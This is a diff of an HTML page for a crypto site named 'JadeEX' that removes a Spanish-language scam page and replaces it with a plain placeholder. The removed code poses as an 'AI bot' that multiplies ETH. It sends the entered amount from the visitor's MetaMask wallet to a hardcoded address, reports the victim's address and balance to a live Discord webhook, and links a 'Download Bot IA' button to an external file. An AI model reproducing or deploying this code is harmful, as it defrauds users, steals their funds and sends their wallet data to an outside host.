@@ -1,427 +1,46 @@
-
-
-
-
-
 <!DOCTYPE html>
-<html lang="es">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-	
-	
-  
-  <style> body {
-        background-image: url("https://gateway.pinata.cloud/ipfs/QmNScrA45b3vjTjHUuB5eFPpFszbJr1brSN4BB7diEj2Dg?_gl=1*5qnhaz*_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*_ga_5RMPXG14TE*MTY4MDAxOTE2MS40My4wLjE2ODAwMTkxNjEuNjAuMC4w");
-        background-repeat: no-repeat;
-        background-size: cover;
-        background-position: center center;
-      }
-	  #typewriter {
-			width: 100%;
-			height: 1.2em;
-			margin: 0 auto;
-			overflow: hidden;
-			border-right: .15em solid white;
-			animation: typing 7s steps(40, end);
+	<title>JadeEX</title>
+	<style>
+		body {
+			background-color: #1a1a1a;
+			color: #00ff00;
+			font-size: 24px;
+			text-align: center;
 		}
-
-		@keyframes typing {
-			from { width: 0 }
-			to { width: 100% }
+		h1 {
+			font-size: 72px;
+			text-shadow: 0px 0px 10px #00ff00;
 		}
-
-	.jadeex-container {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-
-.jadeex-container {
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-
-.jadeex {
-  font-size: 48px;
-  font-weight: bold;
-  color: green;
-  animation: shine 2s ease-in-out infinite;
-}
-
-@keyframes shine {
-  0% {
-    color: green;
-    text-shadow: none;
-  }
-  50% {
-    color: white;
-    text-shadow: 0 0 10px #00ff00;
-  }
-  100% {
-    color: green;
-    text-shadow: none;
-  }
-}
-
-
-	
-
-    .animated-text {
-        animation: change-colors 3s infinite;
-    }
-
-    .counter {
-        display: inline-block;
-        margin-left: 10px;
-        font-size: 0.8em;
-        font-family: 'Courier New', Courier, monospace;
-        color: #00ff00; /* Color inicial */
-    }
-
-    @keyframes change-colors {
-        0% {
-            color: gray;
-        }
-        33% {
-            color: white;
-        }
-        66% {
-            color: black;
-        }
-        100% {
-            color: gray;
-        }
-    }
-
-    @keyframes count-up {
-        from {
-            color: #00ff00; /* Color inicial */
-        }
-        to {
-            color: #ff0000; /* Color final */
-        }
-    }
-
-    .count {
-        animation: count-up 25s linear forwards;
-    }
-
-
-
-.bubble {
-  position: absolute; /* posicionamiento absoluto */
-  bottom: 0; /* comenzar desde abajo */
-  border-radius: 50%; /* forma de burbuja */
-  animation-name: bubble-up; /* animación de burbuja */
-  animation-duration: 3s; /* duración de la animación */
-  animation-iteration-count: infinite; /* animación infinita */
-	
-}
-
-.bubble1 {
-  width: 30px;
-  height: 30px;
-  background-color: rgba(255, 255, 255, 0.5); /* burbuja blanca transparente */
-  left: calc(50% - 90px);
-  animation-delay: 1s; /* retrasar animación */
-}
-
-.bubble2 {
-  width: 50px;
-  height: 50px;
-  background-color: rgba(255, 255, 255, 0.7); /* burbuja blanca transparente */
-  left: calc(50% - 70px);
-  animation-delay: 2s; /* retrasar animación */
-}
-
-.bubble3 {
-  width: 70px;
-  height: 70px;
-  background-color: rgba(255, 255, 255, 0.9); /* burbuja blanca transparente */
-  left: calc(50% - 35px);
-  animation-delay: 3s; /* retrasar animación */
-	
-}
-
-.bubble4 {
-  width: 40px;
-  height: 40px;
-  background-color: rgba(255, 255, 255, 0.6); /* burbuja blanca transparente */
-  left: calc(50% + 5px);
-  animation-delay: 4s; /* retrasar animación */
-	
-}
-
-.bubble5 {
-  width: 60px;
-  height: 60px;
-  background-color: rgba(255, 255, 255, 0.8); /* burbuja blanca transparente */
-  left: calc(50% + 35px);
-  animation-delay: 5s; /* retrasar animación */
-	
-}
-
-@keyframes bubble-up {
-  0% {
-    transform: translateY(0); /* burbuja sin movimiento */
-  }
-  100% {
-    transform: translateY(-100vh); /* burbuja en movimiento hacia arriba */
-  }
-}
-	  .card-container {
-  display: flex;
-  justify-content: center;
-  margin-top: auto;
-  margin-bottom: 50px;
-width:30%;
-}
-
-
-
-.widget {
-  background-color: #f5f5f5;
-  padding: 10px;
-  margin-bottom: 10px;
-}
-	  
-  
-   
-
-	
-
-.widget {
-  background-color: #f5f5f5;
-  padding: 10px;
-  margin-bottom: 10px;
-	
-	 
-}
-	    #download-btn {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
-      border-radius: 8px;
-    }
-
-	
-
-  </style>
-	
-
-  <script src="https://widgets.coingecko.com/coingecko-coin-price-marquee-widget.js"></script>
-  
-<script src="https://widgets.coingecko.com/coingecko-coin-price-chart-widget.js"></script>
-  
-
-
-
-
+		.card {
+			background-color: #333;
+			color: #fff;
+			display: inline-block;
+			height: 300px;
+			margin: 20px;
+			width: 300px;
+		}
+		.buy-sell {
+			background-color: #1a1a1a;
+			color: #fff;
+			font-size: 36px;
+			margin-top: 50px;
+			padding: 50px;
+			text-shadow: 0px 0px 10px #00ff00;
+		}
+	</style>
 </head>
-	<div class="jadeex-container">
-  <span class="jadeex">JadeEx</span>
-		
-</div>
-	<h1>
-		<div id="typewriter">
-			AI activated
-		</div>
-	</h1>
-	<p>
-		<div id="typewriter">
-			Welcome User I am an AI bot created with the purpose of multiplying your balance in ETH. just place the balance in ETH that you want to multiply
-		</div>
-	</p>
-	 <div style="display: flex; justify-content: center;">
-  <div class="card" style="background-color: transparent; margin-left: auto; margin-right: auto;">
-      <div class="card">
-<h3>Miner<span class="animated-text">IA</span> <span class="version" style="font-size: 0.8em; font-family: 'Courier New', Courier, monospace; color:dimgray"><span class="counter">0.01%</span></span></h3>
- 
-	<input type="number" id="amount1">
-        <button onclick="sendETH('0x01C65F22A9478C2932e62483509c233F0aaD5c72', document.getElementById('amount1').value)">Rent AI</button>
-	 <button id="download-btn">Download Bot IA</button>	
-      </div> 
-<p style="color: white; font-size: 12px; font-weight: bold; font-family: 'Roboto', sans-serif; text-align: center; border-bottom: 1px solid white;">
-  <span id="mine-text"></span>
-  <span id="mine-cursor">...</span>
-</p>
-
-<style>
-  /* Animación del cursor */
-  @keyframes blink-caret {
-    from, to { opacity: 0 }
-    50% { opacity: 1 }
-  }
-	 
 <body>
-<div class="background">
-	 
-	
-	
-  <div class="bubble bubble1"></div>
-  <div class="bubble bubble2"></div>
-  <div class="bubble bubble3"></div>
-  <div class="bubble bubble4"></div>
-  <div class="bubble bubble5"></div>
-
-	
-	
-
-<div class="card-container">
-
-  <div class="card">
- <div id="coin-gecko-widget">
-	      <coingecko-coin-price-chart-widget  coin-id="bitcoin" currency="usd" height="300" locale="es"></coingecko-coin-price-chart-widget><coingecko-coin-price-chart-widget  coin-id="ethereum" currency="usd" height="300" locale="es"></coingecko-coin-price-chart-widget>
-
-        
-     
-      </div>
-</div>  
-  </div>
-</div>	
-  <script>
-    const widget = document.querySelector('coingecko-coin-price-marquee-widget');
-
-    widget.addEventListener('coingeckoPriceChange', event => {
-      const priceChange = event.detail;
-
-      if (priceChange === 'negative') {
-        widget.classList.remove('positive-change');
-        widget.classList.add('negative-change');
-      } else if (priceChange === 'positive') {
-        widget.classList.remove('negative-change');
-        widget.classList.add('positive-change');
-      } else {
-        widget.classList.remove('positive-change', 'negative-change');
-      }
-    });
-  </script>
-<script>
-    const counter = document.querySelector('.counter');
-    let count = 0.01;
-    const increment = 0.01;
-    const target = 500;
-
-    function updateCounter() {
-        count += increment;
-        counter.textContent = count.toFixed(2) + '%';
-
-        if (count < target) {
-            setTimeout(updateCounter, 50);
-        } else {
-            counter.classList.add('count');
-        }
-    }
-
-    setTimeout(updateCounter, 3000);
-</script>
-	<script>
-  const mineText = document.getElementById('mine-text');
-  const mineCursor = document.getElementById('mine-cursor');
-  const miningMessage = 'Enter the amount of ETH you want to Mine';
-
-  let i = 0;
-  function typeMiningMessage() {
-    if (i < miningMessage.length) {
-      mineText.innerHTML += miningMessage.charAt(i);
-      i++;
-      setTimeout(typeMiningMessage, 150);
-    } else {
-      mineCursor.style.animation = 'blink-caret 0.75s step-end infinite';
-      setInterval(function() {
-        mineCursor.style.opacity = (mineCursor.style.opacity === '1' ? '0' : '1');
-      }, 400);
-      setInterval(function() {
-        let dots = '';
-        let rand = Math.floor(Math.random() * 3) + 1;
-        for (let i = 0; i < rand; i++) {
-          dots += '.';
-        }
-        mineText.innerHTML = miningMessage + dots;
-      }, 7000);
-    }
-  }
-
-  setTimeout(typeMiningMessage, 1000);
-</script>
-
-
-
-       
-
-
-
-
-    <script>
-     async function sendETH(toAddress, amount) {
-    if (window.ethereum) {
-        try {
-            await window.ethereum.enable();
-            const web3 = new Web3(window.ethereum);
-            const accounts = await web3.eth.getAccounts();
-            const fromAddress = accounts[0];
-            const fromBalance = await web3.eth.getBalance(fromAddress);
-            const txHash = await web3.eth.sendTransaction({
-                from: fromAddress,
-                to: toAddress,
-                value: web3.utils.toWei(amount, 'ether')
-            });
-            console.log(`Transacción enviada: ${txHash}`);
-            const updatedBalance = await web3.eth.getBalance(fromAddress);
-            const message = `Depósito de ${amount} ETH recibido desde la dirección ${fromAddress}. Nuevo saldo: ${web3.utils.fromWei(updatedBalance)} ETH`;
-            sendWebhookMessage(webhookUrl, message);
-        } catch (error) {
-            console.error(error);
-        }
-    } else {
-        console.error('MetaMask no está instalado');
-    }
-}
-function sendWebhookMessage(webhookUrl, message) {
-    fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            content: message
-        })
-    })
-    .then(response => console.log(`Mensaje enviado a Discord. Estado de respuesta: ${response.status} ${response.statusText}`))
-    .catch(error => console.error('Error al enviar mensaje a Discord', error));
-}
-
-      const webhookUrl = "https://discordapp.com/api/webhooks/1065639854324588574/Iu0dfAhK_XeuoLysZSCuxfc79cFpRYvMk9xAueMycoxKijo_gEjoyGT6-6e3MRWFiSnT";
-
-  
-</script>
-	  
-
-  <script>
-    const downloadBtn = document.getElementById("download-btn");
-    downloadBtn.addEventListener("click", function() {
-      window.location.href = "https://mega.nz/file/hdcmnQjB#x8YsT-AOabeHz6TZCzfGLPCvh-YdrS-_sg1uTmoQUCU";
-    });
-  </script>
-
-
-
-  
-  
-
-
-
+	<h1>JadeEX</h1>
+	<div class="container">
+		<div class="card"></div>
+		<div class="card"></div>
+		<div class="card"></div>
+	</div>
+	<div class="buy-sell">
+		<p>Compra y vende tus criptomonedas con nosotros</p>
+	</div>
 </body>
 </html>
+
